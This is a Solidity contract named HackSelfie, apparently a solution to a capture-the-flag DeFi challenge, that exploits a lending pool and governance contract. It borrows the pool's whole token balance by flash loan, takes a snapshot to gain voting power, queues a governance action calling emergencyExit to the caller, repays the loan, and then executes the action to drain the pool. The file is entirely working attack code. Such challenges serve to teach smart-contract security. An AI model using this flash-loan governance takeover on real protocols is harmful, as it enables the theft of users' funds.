// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ISimpleGovernance.sol";
import "../IERC20.sol";

interface IFlashPool {
    function flashLoan(
        address receiver,
        address _token,
        uint256 _amount,
        bytes calldata _data
    ) external returns (bool);
}

interface Itoken is IERC20 {
    // function balanceOf(address account) external view returns (uint256);
    function getBalanceAtLastSnapshot(
        address account
    ) external view returns (uint256);

    function snapshot() external returns (uint256 lastSnapshotId);
}

contract HackSelfie {
    // Loan larger amount of DVT Token => take the control of goverment => set callbackdata to withdraw all token

    IFlashPool private pool;
    Itoken private token;
    ISimpleGovernance private governance;

    uint256 public actionId;

    constructor(address _pool, address _token, address _governance) {
        pool = IFlashPool(_pool);
        token = Itoken(_token);
        governance = ISimpleGovernance(_governance);
    }

    function getFlashLoan() external {
        // get amount of pool token
        uint256 balance = token.balanceOf(address(pool));
        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            msg.sender
        );

        // call flashLoan
        pool.flashLoan(address(this), address(token), balance, data);
        // Check if snapSHot is correct
        uint balanceSnapshot = token.getBalanceAtLastSnapshot(address(this));

        require(balanceSnapshot == balance, "SnapShot faild");
    }

    function execute(uint256 actionId) external {
        // get action Id
        governance.executeAction(actionId);
        // Check the requirement
        uint256 balanceAfter = token.balanceOf(msg.sender);
        require(balanceAfter > 0, "hack Faild");
    }

    function onFlashLoan(
        address sender,
        address _token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32 result) {
        // Do something with hacking after receiver the fund
        Itoken(_token).snapshot();
        // quueAction
        actionId = governance.queueAction(address(pool), 0, data);
        // Approve for transferBackToken
        Itoken(_token).approve(address(pool), amount);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}
//
